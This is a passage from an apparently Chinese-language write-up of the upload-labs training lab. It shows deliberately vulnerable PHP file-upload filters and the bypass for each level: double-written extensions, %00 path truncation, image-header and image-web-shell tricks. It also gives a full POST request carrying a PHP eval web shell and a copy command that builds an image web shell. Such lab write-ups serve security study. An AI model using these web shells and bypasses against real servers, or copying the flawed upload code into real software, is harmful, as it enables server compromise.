class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  黑名单过滤，注意第15行和之前不太一样，路径拼接的是处理后的文件名，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code> </p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里是将问题后缀名替换为空，于是可以利用双写绕过, 文件名改成<code>10.pphphp</code> </p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 白名单判断，但是<code>$img_path</code>直接拼接，因此可以利用%00截断绕过 </p><p>post数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /Pass-11/index.php?save_path=../upload/66.php%00 HTTP/1.1</span><br><span class="line">Host: sec.jxust.edu.cn:8003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------30741385511279</span><br><span class="line">Content-Length: 324</span><br><span class="line">Origin: http://sec.jxust.edu.cn:8003</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://sec.jxust.edu.cn:8003/Pass-11/index.php</span><br><span class="line">Cookie: session=131ab304-3275-463c-80d3-bcf5bba8470e; _webvpn_key=; webvpn_username=; PHPSESSID=rrs5klertds3dame7hsk5k66e3; security=impossible</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------30741385511279</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;66.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&apos;a&apos;]); ?&gt; </span><br><span class="line">-----------------------------30741385511279</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------30741385511279--</span><br></pre></td></tr></table></figure><p>注意以下两行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /Pass-11/index.php?save_path=../upload/66.php%00 HTTP/1.1</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;66.jpg&quot;</span><br></pre></td></tr></table></figure></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理同<strong>Pass-11</strong>，上传路径<code>0x00</code>绕过。利用<code>Burpsuite</code>的Hex功能将<code>save_path</code>改成<code>../upload/12.php【二进制00】</code>形式</p><p><img src="https://raw.githubusercontent.com/LandGrey/upload-labs-writeup/master/image/12-1.png" alt=""> </p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>提示</p><p> 本pass检查图标内容开头2个字节！ </p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 使用命令<code>copy normal.jpg /b + shell.php /a webshell.jpg</code>，将<code>php</code>一句话追加到<code>jpg</code>图片末尾，代码不全的话，人工补充完整。形成一个包含<code>Webshell</code>代码的新<code>jpg`</code>图片，然后直接上传即可。  接下来利用的话，还需要结合文件包含漏洞。 </p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>提示</p><p> 本pass使用<code>getimagesize()</code>检查是否为图片文件！ </p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 直接就可以利用图片马就可进行绕过 </p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>提示</p><p> 本pass使用<code>exif_imagetype()</code>检查是否为图片文件！ </p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 添加<code>GIF</code>图片的文件头绕过检查 </p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>提示</p><p> 本pass重新渲染了图片！ </p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext 